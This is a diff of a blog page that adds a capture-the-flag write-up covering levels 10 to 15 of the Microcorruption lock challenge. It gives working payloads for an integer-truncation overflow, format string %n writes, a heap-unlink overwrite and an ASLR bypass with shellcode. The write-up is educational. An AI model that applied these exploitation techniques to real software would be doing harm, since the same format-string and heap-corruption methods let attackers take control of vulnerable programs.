@@ -9,7 +9,7 @@
   <meta name="author" content="Ido Schimmel">
 
   
-  <meta name="description" content="Introduction Microcorruption CTF (or uctf) is a security challenge in which you are given an electronic lock (Lockit all LockIT Pro) based on the TI &hellip;">
+  <meta name="description" content="Introduction This is the second post about the microcorruption CTF. For the previous post click here. Level 10: Jakarta &ldquo;Zero bottles of beer &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +66,536 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/04/21/microcorruption-ctf-part-ii/">Microcorruption CTF - Part II</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-04-21T22:51:26+03:00" pubdate data-updated="true">Apr 21<span>st</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>Introduction</h2>
+
+<p>This is the second post about the <a href="https://microcorruption.com">microcorruption CTF</a>. For the previous post click <a href="http://idosch.org/blog/2014/04/18/microcorruption-ctf-part-i/">here</a>.</p>
+
+<h2>Level 10: Jakarta</h2>
+
+<p>&ldquo;Zero bottles of beer on the wall, zero bottles of beer; take one down, pass it around, 65535 bottles of beer on the wall.&rdquo;</p>
+
+<p>This quote says it all, but I&rsquo;ll explain anyway. Here the HSM 1 is back so we already know what we need to do: make the notorious <code>login</code> return to <code>unlock_door</code>. However, as always, there is a catch. Both a user name and a password should be entered and their combined length needs to be no more than 31 bytes, which is of course less than the number of bytes needed to overwrite the return address. Below are snippets from <code>login</code> with my remarks.</p>
+
+<p>At this stage you already entered your user name and its length is stored in <code>r11</code>. The following code subtracts your user name&rsquo;s length from <code>0x1f</code> (31), stores the result in <code>r14</code> and use it to read that much bytes from the user as its password using <code>getsn</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>45c8:  3e40 1f00      mov   #0x1f, r14
+</span><span class='line'>45cc:  0e8b           sub   r11, r14
+</span><span class='line'>45ce:  3ef0 ff01      and   #0x1ff, r14
+</span><span class='line'>45d2:  3f40 0224      mov   #0x2402, r15
+</span><span class='line'>45d6:  b012 b846      call  #0x46b8 &lt;getsn&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After entering a password its length will be stored in <code>r15</code> with the user name length still in <code>r11</code>. Therefore, what the following code does is making sure the combined length is no more than 33 bytes, thereby, supposedly preventing us from overwriting the return address. Looking closer you may notice that the above statement is not accurate, as this is a <code>cmp.b</code> instruction that only checks the lower byte of the word and not all of it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>45fe:  0f5b           add   r11, r15
+</span><span class='line'>4600:  7f90 2100      cmp.b #0x21, r15
+</span><span class='line'>4604:  0628           jnc   #0x4612 &lt;login+0xb2&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Knowing all this and keeping in mind the quote from the beginning, the rest should be pretty clear. We begin by entering a user name<code>0x20</code> bytes long, as this will cause <code>r14</code> to become <code>0xffff</code> (-1) in <code>0x45cc</code>, thereby allowing us to enter a password of up to <code>0x1ff</code> bytes.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print '41'*32" | xclip -i</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Assuming the above user name was entered, the stack should look like this before a password is entered:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>3fe0:   0000 0000 7846 0300 ec46 0000 0a00 2000   ....xF...F.... .
+</span><span class='line'>3ff0:   c845 4141 4141 4141 4141 4141 4141 4141   .EAAAAAAAAAAAAAA
+</span><span class='line'>4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
+</span><span class='line'>4010:   4141 0000 0000 4044 0000 0000 0000 0000   AA....@D........</span></code></pre></td></tr></table></div></figure>
+
+
+<p>with the return address (<code>0x4440</code>) at <code>0x4016</code>. Keeping in mind that we already entered <code>0x20</code> bytes and that the lower byte of the combined length needs to be less than <code>0x22</code>, we need a password of length <code>0xe0</code> as the combined length will be <code>0xe0+0x20=0x100</code>. Thus, the following password is used:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print '41'*4 + '4c44' + '41'*218" | xclip -i</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Where the first four bytes simply fill the space between the end of the user name and the start of the return address and the next two bytes are the address of <code>unlock_door</code> (<code>0x444c</code>).</p>
+
+<h2>Level 11: Addis Ababa</h2>
+
+<p>The first thing to notice is the use of the <code>printf</code> subroutine as opposed to previous levels. Therefore, it is pretty obvious it needs to be examined.</p>
+
+<p>The LockIT Pro manual lists the following <code>printf</code> conversion specifiers: <code>s</code>, <code>x</code>, <code>c</code> and <code>n</code>. The most interesting is the last, as it &ldquo;saves the number of characters printed thus far&rdquo;. Thus, it is possible to use this option in order to write data into memory and potentially change the order of execution.</p>
+
+<p>If only one <code>n</code> specifier is used, then the character count up to <code>%</code> is copied to memory location <code>0x0</code>. However, if another specifier is used, then the function assumes the address to write to is given by the first two bytes of the format string. Hence, it is possible to write small values (byte count) to arbitrary memory locations, such as the memory location where the return address of the <code>printf</code> subroutine is stored (<code>0x402e</code>). This bug is usually the result of human error where the programmer mistakenly wrote <code>printf(str_buf)</code> instead of <code>printf("%s", str_buf)</code>. Of course using the <code>n</code> specifier is not the only way to exploit this, but there is a whole class of such exploits, called <a href="http://en.wikipedia.org/wiki/Uncontrolled_format_string">format string vulnerability</a>.</p>
+
+<p>Since we can only write small values it is not possible to change the return address to anything useful (the <code>unlock_door</code> routine is at <code>0x44da</code>). However, in this level the HSM 1 is used, which writes a non-zero value to a specific memory location (<code>0x4032</code> in this case) if the user&rsquo;s password is correct. Owing to the fact that the <code>printf</code> subroutine is called after the password is checked, we can write a non-zero value (our byte count) to <code>0x4032</code>, thereby unlocking the door. This is accomplished by using the following input: <code>0x3240256e256e</code>.</p>
+
+<p>Conclusion: never write <code>printf(buffer)</code>.</p>
+
+<h2>Level 12: Novosibirsk</h2>
+
+<p>This is very similar to the previous level (Addis Ababa). The only difference is that the HSM 2 is used instead of the HSM 1. Therefore, we use the same format string exploit, but instead of changing the memory location where the HSM 1 writes to, we simply change the value passed to the HSM 2 from <code>0x7e</code> (unlock if password is correct) to <code>0x7f</code> (unlock).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print 'c844' + '41'*127 + '256e'" | xclip -i</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 13: Algiers</h2>
+
+<p>This is probably my favorite level. In this level we enter a username and a password which are stored in the heap and not copied to the stack as in previous levels. The memory layout of the LockIT Pro is very much like that of the x86, with the heap growing towards higher memory addresses and the stack growing towards lower memory addresses.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Memory layout:
+</span><span class='line'>----------
+</span><span class='line'>|  heap  |    grows down
+</span><span class='line'>|        |  
+</span><span class='line'>----------
+</span><span class='line'>| stack  |    grows up
+</span><span class='line'>|        |
+</span><span class='line'>----------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Although the HSM 1 is employed in this level with the <code>unlock_door</code> subroutine present, it is not possible to simply overwrite the return address and jump there, as no user entered data is copied to the stack. Starting with the <code>login</code> subroutine we see the following:</p>
+
+<p>Two <code>0x10</code> bytes chunks are allocated on the heap and their respective addresses stored in registers <code>r10</code> and <code>r11</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>463e:  3f40 1000      mov   #0x10, r15
+</span><span class='line'>4642:  b012 6444      call  #0x4464 &lt;malloc&gt;
+</span><span class='line'>4646:  0a4f           mov   r15, r10
+</span><span class='line'>4648:  3f40 1000      mov   #0x10, r15
+</span><span class='line'>464c:  b012 6444      call  #0x4464 &lt;malloc&gt;
+</span><span class='line'>4650:  0b4f           mov   r15, r11</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, a username and a password with a length of up to <code>0x30</code> chars each are written into these chunks with the username in the first chunk. Notice that although the chunk size is only <code>0x10</code> bytes, <code>0x30</code>bytes are read from the user!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>4666:  0f4a           mov   r10, r15
+</span><span class='line'>4668:  b012 0a47      call  #0x470a &lt;getsn&gt;
+</span><span class='line'>466c:  3f40 c845      mov   #0x45c8, r15
+</span><span class='line'>4670:  b012 1a47      call  #0x471a &lt;puts&gt;
+</span><span class='line'>4674:  3f40 d445      mov   #0x45d4, r15
+</span><span class='line'>4678:  b012 1a47      call  #0x471a &lt;puts&gt;
+</span><span class='line'>467c:  3e40 3000      mov   #0x30, r14
+</span><span class='line'>4680:  0f4b           mov   r11, r15
+</span><span class='line'>4682:  b012 0a47      call  #0x470a &lt;getsn&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, the password is passed to <code>test_password_valid</code>, which in turn sends it to the HSM 1, and if it is valid the door is unlocked. As you have probably noticed, the username is not used at all.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>4686:  0f4b           mov   r11, r15
+</span><span class='line'>4688:  b012 7045      call  #0x4570 &lt;test_password_valid&gt;
+</span><span class='line'>468c:  0f93           tst   r15
+</span><span class='line'>468e:  0524           jz    #0x469a &lt;login+0x60&gt;
+</span><span class='line'>4690:  b012 6445      call  #0x4564 &lt;unlock_door&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, both the username and the password are freed from the heap using <code>free</code>, with the password being freed first and then the username.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>46a2:  0f4b           mov   r11, r15
+</span><span class='line'>46a4:  b012 0845      call  #0x4508 &lt;free&gt;
+</span><span class='line'>46a8:  0f4a           mov   r10, r15
+</span><span class='line'>46aa:  b012 0845      call  #0x4508 &lt;free&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One obvious flaw in this program is the one already pointed out: although the username and password are allocated each only <code>0x10</code> bytes, <code>0x30</code> bytes are read from the user. Thus, corrupting the heap seems like a good way for passing this level. A useful way to understand how the heap works is to look at it before and after each <code>malloc</code> call:</p>
+
+<p>Just before allocating <code>0x10</code> bytes for the username:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>2400:   0824 0010 0100 0000 0000 0000 0000 0000   .$..............</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just after allocating <code>0x10</code> bytes for the username:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
+</span><span class='line'>2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
+</span><span class='line'>2420:   0824 c81f 0000 0000 0000 0000 0000 0000   .$..............</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just after allocating <code>0x10</code> bytes for the password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>2400:   0824 0010 0000 0000 0824 1e24 2100 0000   .$.......$.$!...
+</span><span class='line'>2410:   0000 0000 0000 0000 0000 0000 0000 0824   ...............$
+</span><span class='line'>2420:   3424 2100 0000 0000 0000 0000 0000 0000   4$!.............
+</span><span class='line'>2430:   0000 0000 1e24 0824 9c1f 0000 0000 0000   .....$.$........</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looking at these we can see that the heap is managed using a circular doubly-linked list. Each chunk&rsquo;s payload is preceded by a 6 byte allocation metadata containing the addresses of the previous and next chunks and also the size and status (free or not).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;----           6 bytes           ----&gt;
+</span><span class='line'>+----------+----------+---------------+----------------------+
+</span><span class='line'>| bk       | fd       | size/status   | payload              | ...
+</span><span class='line'>+----------+----------+---------------+----------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Quoting <a href="http://g.oswego.edu/dl/html/malloc.html">Doug Lea</a>, this allows for &ldquo;two bordering unused chunks to be coalesced into one large chunk&rdquo; and &ldquo;all chunks can be traversed starting from any known chunk in either a forward or backward direction&rdquo;.</p>
+
+<p>The <code>malloc</code> subroutine is not very useful to us, as it only writes to the heap values which we don&rsquo;t have control over. However, this knowledge greatly helps in reversing the <code>free</code> subroutine, as it puts everything in context. Below is the <code>free</code> subroutine with my comments:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>r15 stores the address of the payload to free.
+</span><span class='line'>4508 &lt;free&gt;
+</span><span class='line'>4508:  0b12           push  r11
+</span><span class='line'>450a:  3f50 faff      add   #0xfffa, r15    // subtract 0x6 to get the address of the allocation metadata.
+</span><span class='line'>450e:  1d4f 0400      mov   0x4(r15), r13   // r13 stores size and allocation status.
+</span><span class='line'>4512:  3df0 feff      and   #0xfffe, r13    // set chunk as free
+</span><span class='line'>4516:  8f4d 0400      mov   r13, 0x4(r15)   // and write back to memory.
+</span><span class='line'>451a:  2e4f           mov   @r15, r14       // r14 stores metadata address of previous chunk.
+</span><span class='line'>451c:  1c4e 0400      mov   0x4(r14), r12   // r12 stores size and allocation status of previous chunk.
+</span><span class='line'>4520:  1cb3           bit   #0x1, r12       // check if previous chunk is free.
+</span><span class='line'>4522:  0d20           jnz   #0x453e &lt;free+0x36&gt; // jump if previous chunk is not free.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the previous chunk is free, we can merge both chunks into one big free chunk. The size of the new chunk is the size of the previous chunk (stored in <code>r12</code>), plus the 6 bytes of the metadata of current chunk plus its size.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>4524:  3c50 0600      add   #0x6, r12
+</span><span class='line'>4528:  0c5d           add   r13, r12
+</span><span class='line'>452a:  8e4c 0400      mov   r12, 0x4(r14)
+</span><span class='line'>452e:  9e4f 0200 0200 mov   0x2(r15), 0x2(r14)  // since the previous chunk is free, set its next pointer to the next pointer of current chunk.
+</span><span class='line'>4534:  1d4f 0200      mov   0x2(r15), r13       // r13 stores address of the next chunk.
+</span><span class='line'>4538:  8d4e 0000      mov   r14, 0x0(r13)       // set the prev pointer of the next chunk to the previous free chunk, creating one big chunk. 
+</span><span class='line'>453c:  2f4f           mov   @r15, r15</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Graphically, this looks as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;----  not in use  ----&gt;         &lt;- chunk to free -&gt;
+</span><span class='line'>+------+------+--------+---------+-----+----+------+---------+------+
+</span><span class='line'>| p_bk | p_fd | p_meta | payload | bk  | fd | meta | payload | n_bk | ...
+</span><span class='line'>+------+------+--------+---------+-----+----+------+---------+------+
+</span><span class='line'>
+</span><span class='line'>&lt;----          not in use             ----&gt;
+</span><span class='line'>+------+-----------+----------------------+------------------+---------------------------+
+</span><span class='line'>| p_bk | p_fd = fd | p_meta += meta + 0x6 |      payload     |   n_bk = address of p_bk  |
+</span><span class='line'>+------+-----------+----------------------+------------------+---------------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If the next chunk is free (as opposed to the previous one), then a very similar process takes place (not described here). Writing the above code snippet in C it will look something like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>prev = p-&gt;bk;
+</span><span class='line'>prev-&gt;meta += p-&gt;meta + 6;
+</span><span class='line'>prev-&gt;fd = p-&gt;fd;
+</span><span class='line'>next = p-&gt;fd;
+</span><span class='line'>next-&gt;bk = prev;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>where <code>p</code> is the argument passed to <code>free</code>. Now, since our goal is the overwrite the location of the return address (<code>0x439a</code>) of the <code>login</code> subroutine with the address of the <code>unlock_door</code> subroutine (<code>0x4564</code>) we can use the following values:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>p-&gt;bk = 0x4396;
+</span><span class='line'>p-&gt;fd = 0x4400;
+</span><span class='line'>p-&gt;status = 0x011e;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Keeping in mind that we can overwrite the metadata of a chunk by overflowing the payload of the one preceding it, it&rsquo;s easy to overwrite the metadata of the chunk storing the password by inserting a username with a length of 22 chars, such as this one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ python2 -c "print '41'*16 + '9643' + '0044' + '1e01'" | xclip -i</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 14: Vladivostok</h2>
+
+<p>Up until now, whenever we wanted to change the order of execution we knew in advance the address we wanted to get to (usually that of the <code>unlock_door</code> subroutine). However, in this level <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a> is introduced. As the name suggests, ASLR randomly arranges the address space before each execution, thereby hindering our ability to jump to a particular memory location. To understand this better lets breakdown the <code>main</code> subroutine.</p>
+
+<p>First, the <code>rand</code> subroutine is called twice to generate two random values stored in <code>r11</code> and <code>r10</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>4438 &lt;main&gt;
+</span><span class='line'>4438:  b012 1c4a      call  #0x4a1c &lt;rand&gt;
+</span><span class='line'>443c:  0b4f           mov   r15, r11
+</span><span class='line'>443e:  3bf0 fe7f      and   #0x7ffe, r11
+</span><span class='line'>4442:  3b50 0060      add   #0x6000, r11
+</span><span class='line'>4446:  b012 1c4a      call  #0x4a1c &lt;rand&gt;
+</span><span class='line'>444a:  0a4f           mov   r15, r10</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next, using <code>memcpy</code> the program code it copied over to the random location pointed to by <code>r11</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>444c:  3012 0010      push  #0x1000
+</span><span class='line'>4450:  3012 0044      push  #0x4400 &lt;__init_stack&gt;
+</span><span class='line'>4454:  0b12           push  r11
+</span><span class='line'>4456:  b012 e849      call  #0x49e8 &lt;_memcpy&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Leaving the stack in its original location isn&rsquo;t very smart, so it&rsquo;s setup in a new memory location using the second random value stored in &lsquo;r10&rsquo;:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>445a:  3150 0600      add   #0x6, sp
+</span><span class='line'>445e:  0f4a           mov   r10, r15
+</span><span class='line'>4460:  3ff0 fe0f      and   #0xffe, r15
+</span><span class='line'>4464:  0e4b           mov   r11, r14
+</span><span class='line'>4466:  0e8f           sub   r15, r14
+</span><span class='line'>4468:  3e50 00ff      add   #0xff00, r14
+</span><span class='line'>...
+</span><span class='line'>4472:  014e           mov   r14, sp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Finally, the program calls the <code>aslr_main</code> subroutine located in its new random memory location.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>446c:  0d4b           mov   r11, r13
+</span><span class='line'>446e:  3d50 5c03      add   #0x35c, r13
+</span><span class='line'>...
+</span><span class='line'>4474:  0f4b           mov   r11, r15
+</span><span class='line'>4476:  8d12           call  r13</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the whole program is copied over to a new memory location, I wrote a little script that given the original code and the ASLR offset (stored in <code>r11</code>) outputs the code with the new addresses:</p>
+
+<div><script src='https://gist.github.com/8c3d94e69cd5cf683f5c.js?file=vladivostok.py'></script>
+<noscript><pre><code>import argparse
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;asm&quot;, help=&quot;assembly code file&quot;, type=str)
+    parser.add_argument(&quot;output_asm&quot;, help=&quot;assembly output file&quot;, type=str)
+    parser.add_argument(&quot;offset&quot;, help=&quot;aslr offset (e.g. 0xffff)&quot;, type=str)
+    args = parser.parse_args()
+
+    f = open(args.asm, &#39;r&#39;)
+    code = f.readlines()
+    f.close()
+    f = open(args.output_asm, &#39;w&#39;)
+    base_address = int(&#39;0x4400&#39;, 16)
+    for line in code[2:]:
+        address = int(line[:4], 16)
+        new_address = hex(address - base_address + int(args.offset, 16))
+        f.write(new_address + line[4:])
+    f.close()
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre></noscript></div>
+
+
+<p>Now, what the <code>aslr_main</code> subroutine does is merely call the <code>_aslr_main</code> subroutine, which is quite long. By means of dynamic analysis we see that this subroutine prompts for a username, prints it and then prompts for a password, which is passed to the HSM 2. Entering a long username does not reveal anything except for the fact that no more than 8 chars are printed. However, once we enter more than 8 chars as a password we get the following message:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>insn address unaligned</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Therefore, we conclude that the password is stored on the stack and that we can overwrite the return address! Further investigation reveals that username is printed using <code>printf</code> (as opposed to <code>puts</code>) and that <code>0x14</code> bytes are read from the user as a password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>45da:  3241           pop   sr
+</span><span class='line'>45dc:  3152           add   #0x8, sp
+</span><span class='line'>45de:  c24e 2e24      mov.b r14, &0x242e    // makes sure no more than 8 bytes are printed.
+</span><span class='line'>45e2:  0b12           push  r11
+</span><span class='line'>45e4:  8c12           call  r12     // r12 stores the address of printf.
+</span><span class='line'>...
+</span><span class='line'>4684:  3241           pop   sr
+</span><span class='line'>4686:  3152           add   #0x8, sp
+</span><span class='line'>4688:  0b41           mov   sp, r11
+</span><span class='line'>468a:  2b52           add   #0x4, r11
+</span><span class='line'>468c:  3c40 1400      mov   #0x14, r12  // read up to 0x14 bytes.
+</span><span class='line'>4690:  2d43           mov   #0x2, r13   // according to the LockIT manual 0x2 is the interrupt for gets.
+</span><span class='line'>4692:  0c12           push  r12
+</span><span class='line'>4694:  0b12           push  r11
+</span><span class='line'>4696:  0d12           push  r13
+</span><span class='line'>4698:  0012           push  pc
+</span><span class='line'>469a:  0212           push  sr
+</span><span class='line'>469c:  0f4d           mov   r13, r15
+</span><span class='line'>469e:  8f10           swpb  r15
+</span><span class='line'>46a0:  024f           mov   r15, sr
+</span><span class='line'>46a2:  32d0 0080      bis   #0x8000, sr
+</span><span class='line'>46a6:  b012 1000      call  #0x10</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since the HSM 2 is used we don&rsquo;t have any <code>unlock_door</code> subroutine to return to (even if there was, we don&rsquo;t know its address due to ASLR) and we also can&rsquo;t use the previously discussed format string vulnerabilities, as we don&rsquo;t know where the argument we want to change is stored. Thus, our only option it to write a <a href="http://en.wikipedia.org/wiki/Shellcode">shellcode</a> to the stack, that will pass the <code>INT</code> subroutine <code>0x7f</code> (trigger unlock) as an argument. However, pointing the PC to its location a problem, as we don&rsquo;t know where the stack is located.</p>
+
+<p>Although it&rsquo;s not possible to use the <code>%n</code> specifier to do anything useful, we can still exploit the <code>printf</code> subroutine by passing it the <code>%x</code> specifier that will print the values found on the stack. Entering <code>%x%x</code> we get the following output (it depends on the first value produced by <code>rand</code>):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0000bcdc</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which is the address of <code>printf</code>! Knowing the the new address of <code>printf</code> and the program&rsquo;s structure we can easily overwrite the return address with that of our shellcode (also on the stack), which will trigger an unlock.</p>
+
+<h2>Level 15: Lagos</h2>
+
+<p>Lagos is an ordinary level except for the fact the only alphanumeric characters can be used for the password. This greatly decreases the number of instructions we can use in our shellcode. Thankfully, Ryan Hitchman has already compiled a <a href="https://gist.github.com/rmmh/8515577">list</a> of instructions that can be represented using only alphanumeric characters.</p>
+
